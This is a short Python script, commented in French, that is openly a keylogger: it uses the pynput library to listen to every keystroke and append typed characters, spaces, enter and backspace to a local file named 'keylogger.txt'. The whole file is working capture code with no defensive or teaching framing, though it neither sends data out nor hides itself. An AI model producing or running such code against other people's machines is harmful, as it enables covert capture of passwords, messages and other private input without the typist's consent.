from pynput import keyboard


def onPush(key):
    """
    enregistre dans un fichier texte les touches frappes
    """

    try:
        with open("keylogger.txt", "a") as f:
            f.write(f"{key.char}")  # on gere les touches alphanumeriques
    except AttributeError as e:  # on decide de gerer les autres touches
        if key == keyboard.Key.space:
            with open("keylogger.txt", "a") as f:
                f.write(" ")  # on ecrit un espace
        if key == keyboard.Key.enter:
            with open("keylogger.txt","a") as f:
                f.write(f"{keyboard.Key.enter}")   # on ecrit dans le fichier un saut à la ligne
        if key == keyboard.Key.backspace:
            with open("keylogger.txt","a") as f:
                f.write(f"{keyboard.Key.backspace}")



if __name__ == "__main__":
    with keyboard.Listener(on_press=onPush) as listener:
        listener.join()
